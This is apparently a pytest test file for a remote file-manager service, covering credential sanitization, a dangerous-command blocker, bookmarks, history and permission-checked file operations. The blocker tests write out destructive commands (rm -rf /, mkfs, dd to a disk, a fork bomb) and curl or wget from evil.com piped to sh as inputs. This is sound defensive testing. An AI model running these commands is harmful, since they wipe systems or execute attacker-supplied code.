import json
from unittest.mock import MagicMock, patch

import pytest

from app.services.file_manager_service import Bookmark, FileManagerService, OperationRecord


@pytest.fixture
def service():
    with patch("app.services.file_manager_service._BOOKMARKS_FILE", "/tmp/nonexistent_bookmarks.json"):
        svc = FileManagerService()
        svc._operation_history.clear()
        svc._command_history.clear()
        svc._bookmarks.clear()
        return svc


class TestSanitizeCommand:
    def test_sanitize_password(self):
        result = FileManagerService._sanitize_command("mysql -u root password=secret123")
        assert "secret123" not in result

    def test_sanitize_dash_p(self):
        result = FileManagerService._sanitize_command("mysql -p mypassword")
        assert "mypassword" not in result

    def test_sanitize_no_match(self):
        result = FileManagerService._sanitize_command("ls -la")
        assert result == "ls -la"

    def test_sanitize_api_key(self):
        result = FileManagerService._sanitize_command("curl api_key=abc123")
        assert "abc123" not in result

    def test_sanitize_token(self):
        result = FileManagerService._sanitize_command("curl token=mytoken123")
        assert "mytoken123" not in result

    def test_sanitize_private_key(self):
        result = FileManagerService._sanitize_command("config private_key=pk_value")
        assert "pk_value" not in result

    def test_sanitize_secret(self):
        result = FileManagerService._sanitize_command("config secret=sec_val")
        assert "sec_val" not in result

    def test_sanitize_key_equals(self):
        result = FileManagerService._sanitize_command("config key=keyval")
        assert "keyval" not in result

    def test_sanitize_echo_pipe(self):
        result = FileManagerService._sanitize_command("echo mypass | sudo")
        assert "mypass" not in result

    def test_sanitize_double_dash_password(self):
        result = FileManagerService._sanitize_command("tool --password mypwd")
        assert "mypwd" not in result


class TestIsDangerousCommand:
    def test_rm_root(self):
        is_danger, reason = FileManagerService._is_dangerous_command("rm -rf /")
        assert is_danger is True

    def test_rm_home(self):
        is_danger, reason = FileManagerService._is_dangerous_command("rm -rf ~")
        assert is_danger is True

    def test_mkfs(self):
        is_danger, reason = FileManagerService._is_dangerous_command("mkfs.ext4 /dev/sda1")
        assert is_danger is True

    def test_dd_zero(self):
        is_danger, reason = FileManagerService._is_dangerous_command("dd if=/dev/zero of=/dev/sda")
        assert is_danger is True

    def test_fork_bomb(self):
        is_danger, reason = FileManagerService._is_dangerous_command(":(){ :|:& };:")
        assert is_danger is True

    def test_redirect_to_device(self):
        is_danger, reason = FileManagerService._is_dangerous_command("> /dev/sda")
        assert is_danger is True

    def test_wget_pipe_sh(self):
        is_danger, reason = FileManagerService._is_dangerous_command("wget http://evil.com | sh")
        assert is_danger is True

    def test_curl_pipe_sh(self):
        is_danger, reason = FileManagerService._is_dangerous_command("curl http://evil.com | sh")
        assert is_danger is True

    def test_safe_command(self):
        is_danger, reason = FileManagerService._is_dangerous_command("ls -la")
        assert is_danger is False

    def test_safe_rm(self):
        is_danger, reason = FileManagerService._is_dangerous_command("rm -f specific_file.txt")
        assert is_danger is False

    def test_dd_of_device(self):
        is_danger, reason = FileManagerService._is_dangerous_command("dd if=data.img of=/dev/sda1")
        assert is_danger is True

    def test_chmod_recursive_root(self):
        is_danger, reason = FileManagerService._is_dangerous_command("chmod -R 777 /")
        assert is_danger is True

    def test_mv_to_dev_null(self):
        is_danger, reason = FileManagerService._is_dangerous_command("mv / /dev/null")
        assert is_danger is True

    def test_mv_to_dev_zero(self):
        is_danger, reason = FileManagerService._is_dangerous_command("mv ~ /dev/zero")
        assert is_danger is True

    def test_rm_parent_dir(self):
        is_danger, reason = FileManagerService._is_dangerous_command("rm -rf ..")
        assert is_danger is True

    def test_rm_home_env(self):
        is_danger, reason = FileManagerService._is_dangerous_command("rm -rf $HOME")
        assert is_danger is True

    def test_rm_pwd_env(self):
        is_danger, reason = FileManagerService._is_dangerous_command("rm -rf $PWD")
        assert is_danger is True

    def test_safe_redirect_to_dev_null(self):
        is_danger, reason = FileManagerService._is_dangerous_command("echo hello > /dev/null")
        assert is_danger is False


class TestBookmarkManagement:
    def test_add_bookmark(self, service):
        bookmark = service.add_bookmark("test", "/home", "Home")
        assert bookmark.alias == "test"
        assert bookmark.path == "/home"

    def test_add_duplicate_bookmark_updates(self, service):
        service.add_bookmark("test", "/home", "Home")
        bookmark = service.add_bookmark("test", "/home", "Updated")
        assert bookmark.label == "Updated"

    def test_remove_bookmark(self, service):
        service.add_bookmark("test", "/home", "Home")
        result = service.remove_bookmark("test", "/home")
        assert result is True

    def test_remove_nonexistent_bookmark(self, service):
        result = service.remove_bookmark("test", "/home")
        assert result is False

    def test_list_bookmarks(self, service):
        service.add_bookmark("a1", "/home", "Home")
        service.add_bookmark("a2", "/var", "Var")
        bookmarks = service.list_bookmarks()
        assert len(bookmarks) == 2

    def test_list_bookmarks_by_alias(self, service):
        service.add_bookmark("a1", "/home", "Home")
        service.add_bookmark("a2", "/var", "Var")
        bookmarks = service.list_bookmarks(alias="a1")
        assert len(bookmarks) == 1

    def test_list_bookmarks_no_alias(self, service):
        service.add_bookmark("a1", "/home", "Home")
        bookmarks = service.list_bookmarks(alias=None)
        assert len(bookmarks) == 1


class TestOperationHistory:
    def test_record_operation(self, service):
        service._record_operation("test", "list", "/home", "success")
        history = service.get_operation_history()
        assert len(history) == 1

    def test_get_operation_history_by_alias(self, service):
        service._record_operation("a1", "list", "/home", "success")
        service._record_operation("a2", "list", "/var", "success")
        history = service.get_operation_history(alias="a1")
        assert len(history) == 1

    def test_operation_history_limit(self, service):
        for i in range(5):
            service._record_operation("test", "list", f"/path{i}", "success")
        history = service.get_operation_history(limit=3)
        assert len(history) == 3

    def test_operation_history_overflow(self, service):
        for i in range(10001):
            service._record_operation("test", "list", f"/path{i}", "success")
        assert len(service._operation_history) == 5000

    def test_operation_history_with_detail(self, service):
        service._record_operation("test", "chmod", "/home", "success", "mode=755")
        history = service.get_operation_history()
        assert history[0].detail == "mode=755"


class TestCommandHistory:
    def test_record_command(self, service):
        service._record_command("test", "ls", 0, "output", "")
        history = service.get_command_history()
        assert len(history) == 1

    def test_get_command_history_by_alias(self, service):
        service._record_command("a1", "ls", 0, "out", "")
        service._record_command("a2", "pwd", 0, "out", "")
        history = service.get_command_history(alias="a1")
        assert len(history) == 1

    def test_command_history_sanitized(self, service):
        service._record_command("test", "mysql -p secret", 0, "out", "")
        history = service.get_command_history()
        assert "secret" not in history[0].command

    def test_command_history_truncates_output(self, service):
        long_output = "x" * 1000
        service._record_command("test", "ls", 0, long_output, long_output)
        history = service.get_command_history()
        assert len(history[0].stdout) <= 500
        assert len(history[0].stderr) <= 500

    def test_command_history_overflow(self, service):
        for i in range(10001):
            service._record_command("test", f"cmd{i}", 0, "out", "")
        assert len(service._command_history) == 5000

    def test_command_history_no_alias(self, service):
        service._record_command("a1", "ls", 0, "out", "")
        history = service.get_command_history(alias=None)
        assert len(history) == 1


class TestFileOperationsWithMocks:
    @pytest.fixture
    def mock_deps(self, service):
        with patch.object(service, "_get_connection") as mock_get_conn, \
             patch.object(service, "_release_connection") as mock_release:
            mock_conn = MagicMock()
            mock_get_conn.return_value = mock_conn
            yield mock_conn, mock_get_conn, mock_release

    def test_list_directory(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.list_directory.return_value = []
            mock_perm = MagicMock()
            mock_perm.check_execute_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            result = service.list_directory("test", "/home")
            assert isinstance(result, list)

    def test_list_directory_no_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_execute_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="执行权限"):
                service.list_directory("test", "/home")

    def test_list_directory_exception_records_failure(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.list_directory.side_effect = RuntimeError("fail")
            mock_perm = MagicMock()
            mock_perm.check_execute_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(RuntimeError):
                service.list_directory("test", "/home")
            history = service.get_operation_history()
            assert history[-1].status == "failure"

    def test_exec_command_dangerous(self, service, mock_deps):
        with pytest.raises(PermissionError, match="危险命令"):
            service.exec_command("test", "rm -rf /")

    def test_exec_command_safe(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.exec_command.return_value = {"exit_code": 0, "stdout": "ok", "stderr": "", "command": "ls"}
            mock_perm = MagicMock()
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            result = service.exec_command("test", "ls")
            assert result["exit_code"] == 0

    def test_exec_batch_dangerous(self, service, mock_deps):
        with pytest.raises(PermissionError, match="危险命令"):
            service.exec_batch("test", ["ls", "rm -rf /"])

    def test_get_connection_nonexistent_account(self, service):
        with patch("app.services.file_manager_service.ssh_account_service") as mock_svc:
            mock_svc.get_account.return_value = None
            with pytest.raises(ValueError, match="不存在"):
                service._get_connection("nonexistent")

    def test_read_file_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.read_file.return_value = "file content"
            mock_perm = MagicMock()
            mock_perm.check_read_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            result = service.read_file("test", "/home/file.txt")
            assert result == "file content"

    def test_read_file_no_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_read_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="读取权限"):
                service.read_file("test", "/home/file.txt")

    def test_read_file_exception_records_failure(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.read_file.side_effect = RuntimeError("io error")
            mock_perm = MagicMock()
            mock_perm.check_read_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(RuntimeError):
                service.read_file("test", "/home/file.txt")
            history = service.get_operation_history()
            assert history[-1].status == "failure"

    def test_write_file_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.write_file("test", "/home/file.txt", "content")
            mock_mgr.write_file.assert_called_once()

    def test_write_file_no_write_but_parent_ok(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.side_effect = [False, True]
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.write_file("test", "/home/file.txt", "content")
            mock_mgr.write_file.assert_called_once()

    def test_write_file_no_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.side_effect = [False, False]
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="写入权限"):
                service.write_file("test", "/home/file.txt", "content")

    def test_create_file_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.create_file("test", "/home/newfile.txt")
            mock_mgr.create_file.assert_called_once()

    def test_create_file_no_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="写入权限"):
                service.create_file("test", "/home/newfile.txt")

    def test_create_directory_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_execute_access.return_value = True
            mock_perm.check_write_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.create_directory("test", "/home/newdir")
            mock_mgr.create_directory.assert_called_once()

    def test_create_directory_execute_but_no_write(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_execute_access.return_value = True
            mock_perm.check_write_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="写入权限"):
                service.create_directory("test", "/home/newdir")

    def test_create_directory_no_execute_allows_write(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_execute_access.return_value = False
            mock_perm.check_write_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.create_directory("test", "/home/newdir")
            mock_mgr.create_directory.assert_called_once()

    def test_delete_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.delete("test", "/home/file.txt")
            mock_mgr.delete.assert_called_once()

    def test_delete_no_write_but_parent_ok(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.side_effect = [False, True]
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.delete("test", "/home/file.txt")
            mock_mgr.delete.assert_called_once()

    def test_delete_no_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.side_effect = [False, False]
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="删除权限"):
                service.delete("test", "/home/file.txt")

    def test_rename_success_same_parent(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.rename("test", "/home/a.txt", "/home/b.txt")
            mock_mgr.rename.assert_called_once()

    def test_rename_no_src_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="重命名"):
                service.rename("test", "/home/a.txt", "/home/b.txt")

    def test_rename_different_parent_no_dst_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.side_effect = [True, False]
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="写入目标"):
                service.rename("test", "/home/a.txt", "/var/b.txt")

    def test_copy_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_read_access.return_value = True
            mock_perm.check_write_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.copy("test", "/home/a.txt", "/home/b.txt")
            mock_mgr.copy.assert_called_once()

    def test_copy_no_read_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_read_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="读取权限"):
                service.copy("test", "/home/a.txt", "/home/b.txt")

    def test_copy_no_write_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_read_access.return_value = True
            mock_perm.check_write_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="写入目标权限"):
                service.copy("test", "/home/a.txt", "/home/b.txt")

    def test_chmod_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.chmod("test", "/home/file.txt", "755")
            mock_mgr.chmod.assert_called_once_with("/home/file.txt", "755")

    def test_chmod_failure(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.chmod.side_effect = RuntimeError("fail")
            mock_perm = MagicMock()
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(RuntimeError):
                service.chmod("test", "/home/file.txt", "755")
            history = service.get_operation_history()
            assert history[-1].status == "failure"

    def test_chown_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_sudo_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.chown("test", "/home/file.txt", user="root", group="root")
            mock_mgr.chown.assert_called_once()

    def test_chown_no_sudo(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_sudo_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="sudo"):
                service.chown("test", "/home/file.txt")

    def test_chown_no_user_no_group(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_sudo_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.chown("test", "/home/file.txt")
            mock_mgr.chown.assert_called_once_with("/home/file.txt", user=None, group=None)

    def test_upload_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.upload("test", "/local/file.txt", "/remote/file.txt")
            mock_mgr.upload.assert_called_once()

    def test_upload_no_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="写入权限"):
                service.upload("test", "/local/file.txt", "/remote/file.txt")

    def test_upload_with_callback(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        cb = MagicMock()
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_write_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.upload("test", "/local/file.txt", "/remote/file.txt", progress_callback=cb)
            mock_mgr.upload.assert_called_once_with(
                "/local/file.txt", "/remote/file.txt", progress_callback=cb
            )

    def test_download_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_read_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.download("test", "/remote/file.txt", "/local/file.txt")
            mock_mgr.download.assert_called_once()

    def test_download_no_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_read_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="读取权限"):
                service.download("test", "/remote/file.txt", "/local/file.txt")

    def test_download_with_callback(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        cb = MagicMock()
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_read_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.download("test", "/remote/file.txt", "/local/file.txt", progress_callback=cb)
            mock_mgr.download.assert_called_once_with(
                "/remote/file.txt", "/local/file.txt", progress_callback=cb
            )

    def test_search_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.search.return_value = []
            mock_perm = MagicMock()
            mock_perm.check_execute_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            result = service.search("test", "/home", "*.txt")
            assert isinstance(result, list)

    def test_search_no_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_execute_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="执行权限"):
                service.search("test", "/home", "*.txt")

    def test_search_with_options(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.search.return_value = []
            mock_perm = MagicMock()
            mock_perm.check_execute_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.search("test", "/home", "*.log", max_depth=3, file_type="f")
            mock_mgr.search.assert_called_once_with(
                "/home", "*.log", max_depth=3, file_type="f"
            )

    def test_get_file_info_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.get_file_info.return_value = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_exists.return_value = True
            mock_perm.check_read_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            result = service.get_file_info("test", "/home/file.txt")
            assert result is not None

    def test_get_file_info_not_exists(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_exists.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(ValueError, match="不存在"):
                service.get_file_info("test", "/home/file.txt")

    def test_get_file_info_no_read_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_perm = MagicMock()
            mock_perm.check_exists.return_value = True
            mock_perm.check_read_access.return_value = False
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            with pytest.raises(PermissionError, match="读取权限"):
                service.get_file_info("test", "/home/file.txt")

    def test_check_permission(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_perm = MagicMock()
            mock_perm.get_file_permissions.return_value = MagicMock()
            mock_with.return_value = (mock_conn, MagicMock(), mock_perm)
            result = service.check_permission("test", "/home")
            assert result is not None

    def test_get_user_info(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_perm = MagicMock()
            mock_perm.get_current_user.return_value = MagicMock()
            mock_with.return_value = (mock_conn, MagicMock(), mock_perm)
            result = service.get_user_info("test")
            assert result is not None

    def test_check_sudo(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_perm = MagicMock()
            mock_perm.check_sudo_access.return_value = True
            mock_with.return_value = (mock_conn, MagicMock(), mock_perm)
            result = service.check_sudo("test")
            assert result is True

    def test_exec_batch_success(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.exec_batch.return_value = [
                {"command": "ls", "exit_code": 0, "stdout": "out", "stderr": ""},
            ]
            mock_perm = MagicMock()
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            result = service.exec_batch("test", ["ls"])
            assert len(result) == 1

    def test_exec_command_records_command(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.exec_command.return_value = {
                "exit_code": 0, "stdout": "ok", "stderr": "", "command": "ls"
            }
            mock_perm = MagicMock()
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            service.exec_command("test", "ls")
            history = service.get_command_history()
            assert len(history) == 1


class TestBatchOperations:
    def test_batch_delete(self, service):
        with patch.object(service, "delete") as mock_delete:
            result = service.batch_delete("test", ["/a", "/b"])
            assert len(result) == 2
            assert all(r["success"] for r in result)

    def test_batch_delete_partial_failure(self, service):
        def side_effect(alias, path):
            if path == "/b":
                raise RuntimeError("fail")

        with patch.object(service, "delete", side_effect=side_effect):
            result = service.batch_delete("test", ["/a", "/b"])
            assert result[0]["success"] is True
            assert result[1]["success"] is False

    def test_batch_chmod(self, service):
        with patch.object(service, "chmod") as mock_chmod:
            result = service.batch_chmod("test", ["/a", "/b"], "755")
            assert len(result) == 2

    def test_batch_chmod_recursive(self, service):
        with patch.object(service, "chmod") as mock_chmod:
            result = service.batch_chmod("test", ["/a"], "755", recursive=True)
            mock_chmod.assert_called_with("test", "/a", "-R 755")

    def test_batch_chmod_partial_failure(self, service):
        def side_effect(alias, path, mode):
            if path == "/b":
                raise RuntimeError("fail")

        with patch.object(service, "chmod", side_effect=side_effect):
            result = service.batch_chmod("test", ["/a", "/b"], "755")
            assert result[0]["success"] is True
            assert result[1]["success"] is False

    def test_batch_delete_empty_list(self, service):
        with patch.object(service, "delete"):
            result = service.batch_delete("test", [])
            assert result == []


class TestBookmarkPersistence:
    def test_load_bookmarks_file_exists(self, service):
        with patch("app.services.file_manager_service._BOOKMARKS_FILE") as mock_file, \
             patch("app.services.file_manager_service.FileManagerService._save_bookmarks"):
            mock_path = MagicMock()
            mock_path.exists.return_value = True
            mock_path.read_text.return_value = json.dumps([
                {"alias": "a1", "path": "/home", "label": "Home", "created_at": "2025-01-01"}
            ])
            with patch("app.services.file_manager_service._BOOKMARKS_FILE", mock_path):
                svc = FileManagerService()
                assert len(svc._bookmarks) == 1

    def test_load_bookmarks_file_not_exists(self):
        with patch("app.services.file_manager_service._BOOKMARKS_FILE") as mock_file:
            mock_path = MagicMock()
            mock_path.exists.return_value = False
            with patch("app.services.file_manager_service._BOOKMARKS_FILE", mock_path):
                svc = FileManagerService()
                assert len(svc._bookmarks) == 0

    def test_load_bookmarks_exception(self):
        with patch("app.services.file_manager_service._BOOKMARKS_FILE") as mock_file:
            mock_path = MagicMock()
            mock_path.exists.return_value = True
            mock_path.read_text.side_effect = Exception("read error")
            with patch("app.services.file_manager_service._BOOKMARKS_FILE", mock_path):
                svc = FileManagerService()
                assert len(svc._bookmarks) == 0

    def test_save_bookmarks_success(self, service):
        with patch("app.services.file_manager_service._BOOKMARKS_FILE") as mock_file:
            mock_path = MagicMock()
            mock_path.parent.mkdir = MagicMock()
            mock_path.write_text = MagicMock()
            with patch("app.services.file_manager_service._BOOKMARKS_FILE", mock_path):
                service.add_bookmark("a1", "/home", "Home")
                mock_path.write_text.assert_called()

    def test_save_bookmarks_exception(self, service):
        with patch("app.services.file_manager_service._BOOKMARKS_FILE") as mock_file:
            mock_path = MagicMock()
            mock_path.parent.mkdir.side_effect = Exception("write error")
            with patch("app.services.file_manager_service._BOOKMARKS_FILE", mock_path):
                service.add_bookmark("a1", "/home", "Home")


class TestWithManager:
    def test_with_manager_returns_tuple(self, service):
        with patch.object(service, "_get_connection") as mock_get:
            mock_conn = MagicMock()
            mock_conn.manager = MagicMock()
            mock_get.return_value = mock_conn
            conn, file_mgr, perm_checker = service._with_manager("test")
            assert conn is mock_conn
            assert file_mgr is not None
            assert perm_checker is not None

    def test_with_manager_custom_timeout(self, service):
        with patch.object(service, "_get_connection") as mock_get:
            mock_conn = MagicMock()
            mock_conn.manager = MagicMock()
            mock_get.return_value = mock_conn
            conn, file_mgr, perm_checker = service._with_manager("test", timeout=60.0)
            assert conn is mock_conn
